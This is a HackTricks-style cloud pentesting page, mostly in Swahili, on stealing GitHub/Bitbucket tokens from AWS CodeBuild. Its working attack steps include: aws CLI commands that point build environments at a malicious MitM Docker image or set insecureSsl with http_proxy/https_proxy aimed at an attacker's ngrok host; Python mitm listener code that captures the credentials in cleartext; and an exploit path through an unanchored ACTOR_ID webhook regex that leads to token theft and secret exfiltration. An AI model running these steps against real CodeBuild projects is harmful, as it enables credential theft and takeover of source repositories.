# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Rejesha Tokens za Github/Bitbucket Zilizosanidiwa

Kwanza, angalia kama kuna source credentials zilizosanidiwa ambazo unaweza leak:
```bash
aws codebuild list-source-credentials
```
### Kupitia Docker Image

Ikiwa utagundua kuwa authentication kwa mfano Github imewekwa kwenye akaunti, unaweza **exfiltrate** huo **ufikiaji** (**GH token or OAuth token**) kwa kufanya Codebuild itumie **docker image** maalum ili kukimbia build ya project.

Kwa madhumuni haya unaweza **unda project mpya ya Codebuild** au kubadilisha **mazingira** ya ile iliyopo ili kuweka **Docker image**.

The Docker image unayoweza kutumia ni [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Hii ni Docker image ya msingi itakayoweka **env variables `https_proxy`**, **`http_proxy`** na **`SSL_CERT_FILE`**. Hii itakuwezesha kuingilia sehemu kubwa ya trafiki ya host iliyotajwa katika **`https_proxy`** na **`http_proxy`** na kuamini SSL CERT iliyotajwa katika **`SSL_CERT_FILE`**.

1. **Tengeneza & Pakia Docker MitM image yako**
- Fuata maelekezo ya repo ili kuweka anwani ya IP ya proxy yako na kuweka SSL cert yako na **jenga docker image**.
- **DO NOT SET `http_proxy`** ili kuepuka kuingilia maombi kuelekea metadata endpoint.
- Unaweza kutumia **`ngrok`** kama `ngrok tcp 4444` ili kuweka proxy kwa host yako
- Mara utakapo jenga Docker image, **pakia kwenye repo ya umma** (Dockerhub, ECR...)
2. **Weka mazingira**
- Unda **project mpya ya Codebuild** au **badilisha** mazingira ya ile iliyopo.
- Weka project itumie **Docker image uliyoitengeneza hapo awali**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Sanidi MitM proxy kwenye host yako**

- Kama ilivyoonyeshwa katika **Github repo** unaweza kutumia kitu kama:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> Toleo la **mitmproxy 9.0.1** lililotumika; imeripotiwa kwamba kwa toleo 10 hii inaweza isifanye kazi.

4. **Endesha build & capture the credentials**

- Unaweza kuona token katika kichwa cha **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Hii pia inaweza kufanywa kupitia aws cli kwa kitu kama
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Kupitia insecureSSL

Miradi ya **Codebuild** yana mpangilio uitwao **`insecureSsl`** ambao umefichwa kwenye web; unaweza kuubadilisha tu kupitia API.\
Kuwezesha hili kunaruhusu Codebuild kuungana na repository **bila kukagua cheti** kinachotolewa na jukwaa.

- Kwanza unahitaji kuorodhesha usanidi wa sasa kwa kitu kama:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Kisha, kwa taarifa zilizokusanywa unaweza kusasisha mipangilio ya mradi **`insecureSsl`** kuwa **`True`**. Ifuatayo ni mfano wa jinsi nilivyosasisha mradi, zingatia **`insecureSsl=True`** mwishoni (hii ndiyo pekee unayohitaji kubadilisha kutoka kwa usanidi uliokusanywa).
- Zaidi ya hayo, ongeza pia vigezo vya mazingira **http_proxy** na **https_proxy** vinavyoelekeza kwa tcp ngrok yako kama:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Kisha, endesha mfano wa msingi kutoka [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) katika bandari iliyoonyeshwa na proxy variables (http_proxy na https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Mwisho, bonyeza kwenye **Build the project**, **credentials** zitatumwa kwa **maandishi wazi** (base64) kwenye port ya mitm:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Kupitia HTTP protocol~~

> [!TIP] > **This vulnerability ilirekebishwa na AWS katika wiki ya 20 Februari 2023 (nadhani Ijumaa). Kwa hivyo mshambuliaji hawezi kuutilia mbinu tena :)**

Mshambuliaji mwenye **idhini iliyoongezeka katika CodeBuild anaweza leak token ya Github/Bitbucket** iliyowekwa, au ikiwa idhini ilianzishwa kupitia OAuth, **token ya muda ya OAuth inayotumiwa kufikia code**.

- Mshambuliaji anaweza kuongeza environment variables **http_proxy** na **https_proxy** kwenye project ya CodeBuild ikielekeza kwa mashine yake (kwa mfano `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Kisha, badilisha URL ya github repo kutumia HTTP badala ya HTTPS, kwa mfano: `http://github.com/carlospolop-forks/TestActions`
- Kisha, endesha mfano wa msingi kutoka [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) kwenye port iliyoonyeshwa na proxy variables (http_proxy na https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Ifuatayo, bonyeza **Build the project** au anzisha ujenzi kutoka mstari wa amri:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Hatimaye, **credentials** zitatumwa kwa **maandishi wazi** (base64) kwa port ya mitm:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Sasa mshambuliaji ataweza kutumia token kutoka kwenye mashine yake, kuorodhesha ruhusa zote anazomiliki na (ab)use kwa urahisi zaidi kuliko kutumia huduma ya CodeBuild moja kwa moja.

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

Webhook za GitHub za CodeBuild zilizosanidiwa vibaya ambazo zinatumia `ACTOR_ID` regexes zisizo na anchoring zinaruhusu PR zisizoaminika kuanzisha privileged builds. Ikiwa allowlist ni kama `123456|7890123` bila `^`/`$`, ID yoyote yenye mojawapo ya sehemu hizo ndogo itafanana. Kwa kuwa GitHub user IDs ni mfululizo, mshambuliaji anaweza kukimbilia kujiandikisha kupata ID ya “eclipsing” (superstring ya ID ya kuaminika) na kuanzisha build.

**Exploit path**

1. Tafuta public CodeBuild projects zinazoonyesha webhook filters na chukua allowlist ya `ACTOR_ID` isiyo na anchoring.
2. Pata eclipsing GitHub ID:
- Sampuli kaunter ya global ID kwa kuunda/kufuta GitHub orgs (org IDs zinashirikiana katika pool).
- Weka tayari uundaji wa manifest nyingi za GitHub App na zipige confirmation URLs wakati kaunter iko ndani ya takriban ~100 IDs za lengo ili kujiandikisha kwa wingi bot ID yenye substring ya kuaminika.
3. Fungua PR kutoka kwa account ya eclipsing; regex inalingana na substring na privileged build inafanywa.
4. Tumia build RCE (mfano, dependency install hooks) kutoa memory ya process inayoshughulikia GitHub credential na kupata PAT/OAuth token.
5. Kwa kutumia token yenye `repo` scope, mkaribishe account yako kama collaborator/admin na push/approve malicious commits au exfiltrate secrets.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
